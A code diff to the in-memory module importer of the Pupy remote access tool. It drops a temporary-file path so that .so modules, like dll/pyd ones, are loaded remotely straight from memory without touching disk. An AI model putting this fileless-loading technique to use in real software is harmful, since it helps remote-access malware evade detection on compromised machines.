@@ -17,7 +17,6 @@
 # Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
 #
 import sys, imp, zlib, marshal
-import tempfile
 
 builtin_memimporter=False
 try:
@@ -94,7 +93,7 @@ class PupyPackageLoader:
                 sys.modules[fullname]=mod
                 c=marshal.loads(self.contents[8:])
                 exec c in mod.__dict__
-            elif self.extension in ("dll","pyd"):
+            elif self.extension in ("dll","pyd","so"):
                 initname = "init" + fullname.rsplit(".",1)[-1]
                 path=fullname.replace(".","/")+"."+self.extension
                 #print "Loading %s from memory"%fullname
@@ -105,12 +104,6 @@ class PupyPackageLoader:
                 mod.__loader__ = self
                 mod.__package__ = fullname.rsplit('.',1)[0]
                 sys.modules[fullname]=mod
-            elif self.extension in ('so',):
-                with tempfile.NamedTemporaryFile(mode='wb') as tmpfile:
-                    tmpfile.write(self.contents)
-                    tmpfile.flush()
-                    initname = fullname.rsplit(".",1)[-1]
-                    sys.modules[fullname]=imp.load_dynamic(initname, tmpfile.name)
         except Exception as e:
             if fullname in sys.modules:
                 del sys.modules[fullname]
